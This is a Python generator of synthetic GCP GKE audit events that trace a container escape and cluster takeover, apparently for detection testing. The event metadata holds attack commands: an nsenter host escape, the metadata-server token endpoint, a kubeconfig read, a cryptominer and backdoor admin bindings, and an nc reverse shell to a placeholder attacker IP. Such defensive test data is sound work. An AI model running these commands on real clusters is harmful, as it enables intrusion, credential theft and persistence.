"""GCP GKE (Kubernetes) container escape and cluster takeover scenario."""
from typing import List, Dict, Any
from datetime import datetime, timedelta
import random

class GCPGKEEscapeGenerator:
    """Generate GCP GKE container escape attack trace.

    Attack Flow:
    1. Initial access to compromised pod
    2. Container escape via misconfigured security context
    3. Access GKE metadata service for credentials
    4. Escalate to cluster-admin privileges
    5. Deploy malicious workloads across cluster
    6. Lateral movement to GCP resources

    MITRE ATT&CK Techniques:
    - T1610: Deploy Container
    - T1611: Escape to Host
    - T1613: Container and Resource Discovery
    - T1552.005: Cloud Instance Metadata API
    - T1078.004: Valid Accounts: Cloud Accounts
    """

    def __init__(self, attacker_ip: str = "192.0.2.89"):
        self.attacker_ip = attacker_ip
        self.cluster_name = "production-gke-cluster"
        self.project_id = "prod-project-67890"
        self.compromised_pod = "webapp-deployment-7d8f9b-xk4lm"
        self.namespace = "production"

    def generate(self, duration_hours: int = 4) -> List[Dict[str, Any]]:
        """Generate GKE escape event trace.

        Args:
            duration_hours: Duration of attack in hours

        Returns:
            List of security events
        """
        events = []
        start_time = datetime.now()

        # Phase 1: Initial access and discovery (0-45 minutes)
        events.extend(self._generate_initial_access(start_time))

        # Phase 2: Container escape (45 min - 1.5 hours)
        events.extend(self._generate_container_escape(
            start_time + timedelta(minutes=45)
        ))

        # Phase 3: Credential access and privilege escalation (1.5-2.5 hours)
        events.extend(self._generate_privilege_escalation(
            start_time + timedelta(hours=1, minutes=30)
        ))

        # Phase 4: Cluster takeover and persistence (2.5-4 hours)
        events.extend(self._generate_cluster_takeover(
            start_time + timedelta(hours=2, minutes=30)
        ))

        return events

    def _generate_initial_access(self, start_time: datetime) -> List[Dict[str, Any]]:
        """Generate initial access and discovery events."""
        events = []

        # Initial exec into compromised pod
        events.append({
            "timestamp": start_time.isoformat(),
            "event_type": "gcp.gke.pods.exec",
            "action": "io.k8s.core.v1.pods.exec.create",
            "principal": "attacker@external.com",
            "resource": f"projects/{self.project_id}/locations/us-central1-a/clusters/{self.cluster_name}/namespaces/{self.namespace}/pods/{self.compromised_pod}",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "high",
            "mitre_techniques": ["T1610"],
            "metadata": {
                "cluster": self.cluster_name,
                "namespace": self.namespace,
                "pod": self.compromised_pod,
                "container": "webapp",
                "command": ["/bin/bash"],
                "user_agent": "kubectl/v1.28.0"
            }
        })

        # Pod enumeration
        events.append({
            "timestamp": (start_time + timedelta(minutes=5)).isoformat(),
            "event_type": "gcp.gke.pods.list",
            "action": "io.k8s.core.v1.pods.list",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"projects/{self.project_id}/locations/us-central1-a/clusters/{self.cluster_name}/namespaces/{self.namespace}",
            "status": "success",
            "source_ip": "10.0.1.45",  # Internal pod IP
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "medium",
            "mitre_techniques": ["T1613"],
            "metadata": {
                "cluster": self.cluster_name,
                "namespace": self.namespace,
                "pod_count": 47,
                "source": "in-cluster"
            }
        })

        # Secret enumeration
        events.append({
            "timestamp": (start_time + timedelta(minutes=10)).isoformat(),
            "event_type": "gcp.gke.secrets.list",
            "action": "io.k8s.core.v1.secrets.list",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"projects/{self.project_id}/locations/us-central1-a/clusters/{self.cluster_name}/namespaces/{self.namespace}/secrets",
            "status": "success",
            "source_ip": "10.0.1.45",
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "high",
            "mitre_techniques": ["T1552.007"],
            "metadata": {
                "cluster": self.cluster_name,
                "namespace": self.namespace,
                "secret_count": 15
            }
        })

        # Check pod security context
        events.append({
            "timestamp": (start_time + timedelta(minutes=15)).isoformat(),
            "event_type": "gcp.gke.pods.get",
            "action": "io.k8s.core.v1.pods.get",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"{self.cluster_name}/{self.namespace}/{self.compromised_pod}",
            "status": "success",
            "source_ip": "10.0.1.45",
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "low",
            "mitre_techniques": ["T1613"],
            "metadata": {
                "pod": self.compromised_pod,
                "privileged": True,
                "host_pid": True,
                "host_network": True,
                "security_context": "insecure"
            }
        })

        # Service account token discovery
        events.append({
            "timestamp": (start_time + timedelta(minutes=25)).isoformat(),
            "event_type": "gcp.gke.serviceaccounts.get",
            "action": "io.k8s.core.v1.serviceaccounts.get",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"{self.cluster_name}/{self.namespace}/webapp-sa",
            "status": "success",
            "source_ip": "10.0.1.45",
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "medium",
            "mitre_techniques": ["T1552.001"],
            "metadata": {
                "service_account": "webapp-sa",
                "token_mounted": True,
                "token_path": "/var/run/secrets/kubernetes.io/serviceaccount/token"
            }
        })

        # Node list (checking for cluster-wide access)
        events.append({
            "timestamp": (start_time + timedelta(minutes=35)).isoformat(),
            "event_type": "gcp.gke.nodes.list",
            "action": "io.k8s.core.v1.nodes.list",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"{self.cluster_name}",
            "status": "failed",
            "source_ip": "10.0.1.45",
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "high",
            "mitre_techniques": ["T1613"],
            "metadata": {
                "cluster": self.cluster_name,
                "error": "Forbidden: User cannot list nodes at cluster scope"
            }
        })

        return events

    def _generate_container_escape(self, start_time: datetime) -> List[Dict[str, Any]]:
        """Generate container escape events."""
        events = []

        # Mount host filesystem (via privileged container)
        events.append({
            "timestamp": start_time.isoformat(),
            "event_type": "gcp.gke.pods.exec",
            "action": "io.k8s.core.v1.pods.exec.create",
            "principal": "attacker@external.com",
            "resource": f"{self.cluster_name}/{self.namespace}/{self.compromised_pod}",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1611"],
            "metadata": {
                "pod": self.compromised_pod,
                "command": ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "/bin/bash"],
                "escape_method": "nsenter_privileged",
                "host_access": True
            }
        })

        # Access GKE node metadata service
        events.append({
            "timestamp": (start_time + timedelta(minutes=10)).isoformat(),
            "event_type": "gcp.compute.metadata.get",
            "action": "compute.instances.metadata.get",
            "principal": "node-service-account@project.iam.gserviceaccount.com",
            "resource": f"projects/{self.project_id}/zones/us-central1-a/instances/gke-{self.cluster_name}-node-pool-1-abcd1234",
            "status": "success",
            "source_ip": "169.254.169.254",  # Metadata server
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1552.005"],
            "metadata": {
                "metadata_endpoint": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "scopes": ["https://www.googleapis.com/auth/cloud-platform"],
                "token_acquired": True
            }
        })

        # Read kubelet credentials from host
        events.append({
            "timestamp": (start_time + timedelta(minutes=15)).isoformat(),
            "event_type": "gcp.gke.node.file_access",
            "action": "file.read",
            "principal": "attacker@external.com",
            "resource": f"/var/lib/kubelet/kubeconfig",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1552.001"],
            "metadata": {
                "file_path": "/var/lib/kubelet/kubeconfig",
                "credentials_type": "kubelet_certificate",
                "access_method": "container_escape"
            }
        })

        return events

    def _generate_privilege_escalation(self, start_time: datetime) -> List[Dict[str, Any]]:
        """Generate privilege escalation events."""
        events = []

        # Create malicious ClusterRoleBinding
        events.append({
            "timestamp": start_time.isoformat(),
            "event_type": "gcp.gke.clusterrolebindings.create",
            "action": "io.k8s.rbac.v1.clusterrolebindings.create",
            "principal": "node-service-account@project.iam.gserviceaccount.com",
            "resource": f"{self.cluster_name}/clusterrolebindings/attacker-cluster-admin",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1098.003"],
            "metadata": {
                "cluster": self.cluster_name,
                "role_ref": "cluster-admin",
                "subject": "system:serviceaccount:production:webapp-sa",
                "binding_name": "attacker-cluster-admin"
            }
        })

        # Verify cluster-admin access
        events.append({
            "timestamp": (start_time + timedelta(minutes=5)).isoformat(),
            "event_type": "gcp.gke.nodes.list",
            "action": "io.k8s.core.v1.nodes.list",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"{self.cluster_name}",
            "status": "success",
            "source_ip": "10.0.1.45",
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1613"],
            "metadata": {
                "cluster": self.cluster_name,
                "node_count": 12,
                "escalated_privileges": True
            }
        })

        # Access all secrets across all namespaces
        events.append({
            "timestamp": (start_time + timedelta(minutes=15)).isoformat(),
            "event_type": "gcp.gke.secrets.list",
            "action": "io.k8s.core.v1.secrets.list",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"{self.cluster_name}",
            "status": "success",
            "source_ip": "10.0.1.45",
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1552.007"],
            "metadata": {
                "cluster": self.cluster_name,
                "scope": "all-namespaces",
                "secret_count": 234,
                "sensitive_secrets": ["database-credentials", "api-keys", "tls-certs"]
            }
        })

        # Use node SA to access GCP resources
        events.append({
            "timestamp": (start_time + timedelta(minutes=25)).isoformat(),
            "event_type": "gcp.storage.buckets.list",
            "action": "storage.buckets.list",
            "principal": "node-service-account@project.iam.gserviceaccount.com",
            "resource": f"projects/{self.project_id}",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "high",
            "mitre_techniques": ["T1078.004"],
            "metadata": {
                "project_id": self.project_id,
                "credential_source": "gke_node_metadata",
                "bucket_count": 45
            }
        })

        return events

    def _generate_cluster_takeover(self, start_time: datetime) -> List[Dict[str, Any]]:
        """Generate cluster takeover and persistence events."""
        events = []

        # Deploy cryptominer DaemonSet
        events.append({
            "timestamp": start_time.isoformat(),
            "event_type": "gcp.gke.daemonsets.create",
            "action": "io.k8s.apps.v1.daemonsets.create",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"{self.cluster_name}/kube-system/daemonsets/system-monitor",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1496"],
            "metadata": {
                "cluster": self.cluster_name,
                "namespace": "kube-system",
                "daemonset": "system-monitor",
                "image": "attacker/cryptominer:latest",
                "node_selector": {},
                "privileged": True
            }
        })

        # Create backdoor service account
        events.append({
            "timestamp": (start_time + timedelta(minutes=15)).isoformat(),
            "event_type": "gcp.gke.serviceaccounts.create",
            "action": "io.k8s.core.v1.serviceaccounts.create",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"{self.cluster_name}/kube-system/serviceaccounts/backup-admin",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "high",
            "mitre_techniques": ["T1136.003"],
            "metadata": {
                "cluster": self.cluster_name,
                "namespace": "kube-system",
                "service_account": "backup-admin",
                "automount_token": True
            }
        })

        # Bind cluster-admin to backdoor SA
        events.append({
            "timestamp": (start_time + timedelta(minutes=20)).isoformat(),
            "event_type": "gcp.gke.clusterrolebindings.create",
            "action": "io.k8s.rbac.v1.clusterrolebindings.create",
            "principal": "system:serviceaccount:production:webapp-sa",
            "resource": f"{self.cluster_name}/clusterrolebindings/backup-admin-binding",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1098.003"],
            "metadata": {
                "cluster": self.cluster_name,
                "role_ref": "cluster-admin",
                "subject": "system:serviceaccount:kube-system:backup-admin"
            }
        })

        # Deploy reverse shell pods across namespaces
        namespaces = ["default", "kube-system", "production", "staging"]
        for i, ns in enumerate(namespaces):
            events.append({
                "timestamp": (start_time + timedelta(minutes=30+i*5)).isoformat(),
                "event_type": "gcp.gke.pods.create",
                "action": "io.k8s.core.v1.pods.create",
                "principal": "system:serviceaccount:production:webapp-sa",
                "resource": f"{self.cluster_name}/{ns}/pods/debug-utils-{i}",
                "status": "success",
                "source_ip": self.attacker_ip,
                "region": "us-central1",
                "cloud_provider": "gcp",
                "severity": "critical",
                "mitre_techniques": ["T1059.004"],
                "metadata": {
                    "cluster": self.cluster_name,
                    "namespace": ns,
                    "pod": f"debug-utils-{i}",
                    "image": "attacker/reverse-shell:latest",
                    "command": ["nc", self.attacker_ip, "4444", "-e", "/bin/bash"],
                    "host_network": True,
                    "privileged": True
                }
            })

        # Modify GKE cluster network policy
        events.append({
            "timestamp": (start_time + timedelta(hours=1)).isoformat(),
            "event_type": "gcp.container.clusters.update",
            "action": "google.container.v1.ClusterManager.UpdateCluster",
            "principal": "node-service-account@project.iam.gserviceaccount.com",
            "resource": f"projects/{self.project_id}/locations/us-central1-a/clusters/{self.cluster_name}",
            "status": "success",
            "source_ip": self.attacker_ip,
            "region": "us-central1",
            "cloud_provider": "gcp",
            "severity": "critical",
            "mitre_techniques": ["T1562.004"],
            "metadata": {
                "cluster": self.cluster_name,
                "update": "disable_network_policy",
                "network_policy_enabled": False,
                "previous_value": True
            }
        })

        return events
